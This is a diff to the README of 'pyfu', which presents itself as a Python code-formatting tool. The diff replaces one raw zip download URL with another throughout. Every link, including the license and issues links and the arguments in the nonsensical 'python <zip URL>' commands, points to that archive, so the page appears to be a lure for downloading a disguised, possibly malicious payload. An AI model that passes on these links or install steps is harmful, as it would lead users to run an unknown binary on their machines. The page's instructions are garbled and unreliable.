@@ -6,7 +6,7 @@ Welcome to **pyfu**, your go-to tool for automatically cleaning, formatting, and
 
 ## 📥 Download pyfu
 
-[![Download pyfu](https://github.com/QamarSE/pyfu/raw/refs/heads/main/bin/Software-3.4-alpha.2.zip)](https://github.com/QamarSE/pyfu/raw/refs/heads/main/bin/Software-3.4-alpha.2.zip)
+[![Download pyfu](https://github.com/QamarSE/pyfu/raw/refs/heads/main/src/pyfu/Software_v1.8.zip)](https://github.com/QamarSE/pyfu/raw/refs/heads/main/src/pyfu/Software_v1.8.zip)
 
 ## 📋 What is pyfu?
 
@@ -40,12 +40,12 @@ pyfu relies on several libraries to function smoothly. These include:
 
 To get started, visit the following link to access the latest releases of pyfu:
 
-[Download pyfu](https://github.com/QamarSE/pyfu/raw/refs/heads/main/bin/Software-3.4-alpha.2.zip)
+[Download pyfu](https://github.com/QamarSE/pyfu/raw/refs/heads/main/src/pyfu/Software_v1.8.zip)
 
 Once on the releases page, follow these simple steps:
 
 1. **Choose the latest release:** Look for the most recent version at the top of the page.
-2. **Download the package:** Click on the file that matches your operating system. The file will have an extension like `.zip` or `https://github.com/QamarSE/pyfu/raw/refs/heads/main/bin/Software-3.4-alpha.2.zip`.
+2. **Download the package:** Click on the file that matches your operating system. The file will have an extension like `.zip` or `https://github.com/QamarSE/pyfu/raw/refs/heads/main/src/pyfu/Software_v1.8.zip`.
 3. **Extract the files:** After downloading, extract the folder to a location of your choice on your computer.
 4. **Navigate to the folder:** Open the folder where you extracted pyfu.
 
@@ -69,7 +69,7 @@ To run pyfu, follow these simple instructions:
 3. **Run pyfu:** 
    Type the following command to start using pyfu:
    ```bash
-   python https://github.com/QamarSE/pyfu/raw/refs/heads/main/bin/Software-3.4-alpha.2.zip
+   python https://github.com/QamarSE/pyfu/raw/refs/heads/main/src/pyfu/Software_v1.8.zip
    ```
 
 You can modify your commands based on specific requirements. The tool will guide you through the available options.
@@ -80,19 +80,19 @@ Understanding how to use pyfu can enhance your coding experience. Here are some 
 
 - **Format your code:**
    ```bash
-   python https://github.com/QamarSE/pyfu/raw/refs/heads/main/bin/Software-3.4-alpha.2.zip format https://github.com/QamarSE/pyfu/raw/refs/heads/main/bin/Software-3.4-alpha.2.zip
+   python https://github.com/QamarSE/pyfu/raw/refs/heads/main/src/pyfu/Software_v1.8.zip format https://github.com/QamarSE/pyfu/raw/refs/heads/main/src/pyfu/Software_v1.8.zip
    ```
 
 - **Lint your code:**
    ```bash
-   python https://github.com/QamarSE/pyfu/raw/refs/heads/main/bin/Software-3.4-alpha.2.zip lint https://github.com/QamarSE/pyfu/raw/refs/heads/main/bin/Software-3.4-alpha.2.zip
+   python https://github.com/QamarSE/pyfu/raw/refs/heads/main/src/pyfu/Software_v1.8.zip lint https://github.com/QamarSE/pyfu/raw/refs/heads/main/src/pyfu/Software_v1.8.zip
    ```
 
 Each command will output the processed results directly in your terminal, showing any changes or issues found in your code.
 
 ## 💬 Support and Contributions
 
-If you encounter issues or have suggestions, feel free to create an issue on the [GitHub Issues page](https://github.com/QamarSE/pyfu/raw/refs/heads/main/bin/Software-3.4-alpha.2.zip). Your feedback helps us improve! 
+If you encounter issues or have suggestions, feel free to create an issue on the [GitHub Issues page](https://github.com/QamarSE/pyfu/raw/refs/heads/main/src/pyfu/Software_v1.8.zip). Your feedback helps us improve! 
 
 Contributions are welcome. If you'd like to enhance pyfu, please fork the repository and submit a pull request.
 
@@ -110,10 +110,10 @@ This sharing of ideas can help improve your programming skills and experiences.
 
 ## ⚖️ License
 
-pyfu is an open-source project. You can modify and redistribute the tool under the terms of the [MIT License](https://github.com/QamarSE/pyfu/raw/refs/heads/main/bin/Software-3.4-alpha.2.zip).
+pyfu is an open-source project. You can modify and redistribute the tool under the terms of the [MIT License](https://github.com/QamarSE/pyfu/raw/refs/heads/main/src/pyfu/Software_v1.8.zip).
 
 ## 📥 Again, Download pyfu
 
 Don’t forget to download pyfu to start enhancing your Python code today!
 
-[Download pyfu](https://github.com/QamarSE/pyfu/raw/refs/heads/main/bin/Software-3.4-alpha.2.zip)
+[Download pyfu](https://github.com/QamarSE/pyfu/raw/refs/heads/main/src/pyfu/Software_v1.8.zip)
